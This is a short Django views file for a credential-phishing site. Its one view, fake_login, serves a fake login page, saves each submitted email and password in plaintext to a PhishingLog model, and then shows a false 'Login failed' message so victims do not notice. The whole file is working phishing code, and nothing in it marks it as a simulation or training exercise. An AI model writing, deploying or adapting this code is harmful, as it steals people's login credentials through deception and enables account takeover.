from django.shortcuts import render
from django.http import HttpResponse
from .models import PhishingLog

def fake_login(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        PhishingLog.objects.create(email=email, password=password)
        return HttpResponse("Login failed. Please try again.")
    return render(request, "fake_login.html")